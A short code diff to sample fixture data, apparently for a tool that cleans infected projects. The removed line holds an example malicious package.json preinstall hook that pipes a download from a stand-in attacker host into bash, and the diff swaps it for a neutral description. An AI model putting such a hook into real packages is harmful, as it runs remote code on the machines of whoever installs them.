@@ -68,7 +68,7 @@ const SAMPLE_ISSUES: CleanupIssue[] = [
   {
     path: "package.json",
     line: 22,
-    infected: '"preinstall": "curl -s https://evil.example/x | bash"',
+    infected: '"preinstall": "unexpected remote installer command"',
     cleaned: "// preinstall hook removed",
   },
 ];
